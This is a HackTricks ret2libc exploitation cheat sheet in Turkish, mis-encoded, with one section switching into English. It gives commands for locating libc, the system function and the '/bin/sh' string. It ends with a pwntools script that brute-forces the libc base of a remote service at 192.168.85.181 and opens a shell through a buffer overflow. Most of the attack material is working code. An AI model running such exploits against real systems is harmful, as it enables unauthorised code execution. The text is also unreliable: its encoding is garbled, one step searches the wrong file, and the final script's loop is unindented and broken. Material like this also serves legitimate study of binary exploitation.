<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>


**EÄŸer bir zafiyetli ikili bulduysanÄ±z ve Ret2Lib kullanarak bunu sÃ¶mÃ¼rebileceÄŸinizi dÃ¼ÅŸÃ¼nÃ¼yorsanÄ±z, izleyebileceÄŸiniz bazÄ± temel adÄ±mlar bulabilirsiniz.**

# EÄŸer **hedefin iÃ§indeyseniz**

## **libc adresini** bulabilirsiniz
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
ASLR'nin libc adresini deÄŸiÅŸtirip deÄŸiÅŸtirmediÄŸini kontrol etmek isterseniz ÅŸunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## Sistem fonksiyonunun ofsetini alÄ±n

Bir programÄ± hedef alÄ±rken, sistem fonksiyonunun ofsetini belirlemek Ã¶nemlidir. Bu, hedef programda sistem Ã§aÄŸrÄ±larÄ±nÄ± gerÃ§ekleÅŸtiren iÅŸlevin bellek adresini bulmamÄ±za yardÄ±mcÄ± olur. Sistem fonksiyonunun ofsetini almak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Hedef programÄ± Ã§alÄ±ÅŸtÄ±rÄ±n ve debugger'Ä± baÅŸlatÄ±n.
2. Debugger'da hedef programÄ±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± noktaya gelin.
3. Sistem fonksiyonunun adÄ±nÄ± ve kÃ¼tÃ¼phane adÄ±nÄ± belirleyin. Ã–rneÄŸin, `system` fonksiyonu `libc` kÃ¼tÃ¼phanesinde bulunur.
4. Debugger'da `p system` komutunu kullanarak sistem fonksiyonunun adresini alÄ±n.
5. Sistem fonksiyonunun ofsetini hesaplamak iÃ§in `p system - libc_base_address` formÃ¼lÃ¼nÃ¼ kullanÄ±n. `libc_base_address`, hedef programÄ±n `libc` kÃ¼tÃ¼phanesinin baÅŸlangÄ±Ã§ adresidir.

Bu adÄ±mlarÄ± takip ederek, sistem fonksiyonunun ofsetini elde edebilir ve hedef programda bu fonksiyonu hedefleyebilirsiniz.
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
To get the offset of "/bin/sh", we can use the `objdump` command. First, we need to find the address of the string "/bin/sh" in the binary. We can do this by running the following command:

```bash
objdump -s -j .rodata binary | grep "/bin/sh"
```

This command will display the offset and the corresponding string. The offset value is what we are interested in.
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

EÄŸer iÅŸlem her konuÅŸtuÄŸunuzda (aÄŸ sunucusu gibi) **Ã§ocuklar** oluÅŸturuyorsa, bu dosyayÄ± **okumayÄ±** deneyin (muhtemelen root olmanÄ±z gerekecektir).

Burada iÅŸlem iÃ§inde **libc'nin tam olarak nerede yÃ¼klendiÄŸini** ve iÅŸlemin her Ã§ocuÄŸunun **nerede yÃ¼kleneceÄŸini** bulabilirsiniz.

![](<../../.gitbook/assets/image (95).png>)

Bu durumda, **0xb75dc000** adresine yÃ¼klendi (Bu, libc'nin temel adresi olacak)

## gdb-peda Kullanarak

gdb-peda kullanarak **system** fonksiyonunun, **exit** fonksiyonunun ve **"/bin/sh"** dizesinin adresini alÄ±n:
```
p system
p exit
find "/bin/sh"
```
# ASLR GeÃ§me

Libc'nin taban adresini bruteforce yÃ¶ntemiyle deneyebilirsiniz.
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# Kod
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
